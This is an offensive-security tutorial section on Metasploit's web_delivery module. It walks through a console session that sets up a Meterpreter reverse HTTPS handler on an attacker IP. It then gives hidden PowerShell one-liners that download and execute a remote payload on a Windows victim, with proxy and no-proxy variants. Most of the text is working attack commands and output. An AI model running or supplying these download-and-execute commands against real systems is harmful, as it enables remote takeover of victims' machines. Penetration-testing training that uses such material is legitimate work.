## Metasploit Web Delivery

[Metasploit Web Delivery](https://www.offensive-security.com/metasploit-unleashed/web-delivery/)

Metasploit’s Web Delivery Script is a versatile module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine. This module has a powershell method which generates a string which is needed to be executed on remote windows machine.

```
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Python
   1   PHP
   2   PSH


msf exploit(web_delivery) > set target 2
target => 2
msf exploit(web_delivery) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf exploit(web_delivery) > set lhost 14.97.131.138
lhost => 14.97.131.138
msf exploit(web_delivery) > run
[*] Exploit running as background job.

[*] Started HTTPS reverse handler on https://14.97.131.138:8443
msf exploit(web_delivery) > [*] Using URL: http://0.0.0.0:8080/uMOKs6wtlYL
[*] Local IP: http://14.97.131.138:8080/uMOKs6wtlYL
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
```

 When the following command \(when there is no proxy\)

```
powershell.exe -nop -w hidden -c $X=new-object net.webclient;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
```

 or \(when there is proxy\)

```
powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
```

 is executed on the windows remote machine, we should get a meterpreter.

```
Delivery web_delivery payload
meterprerter>
```





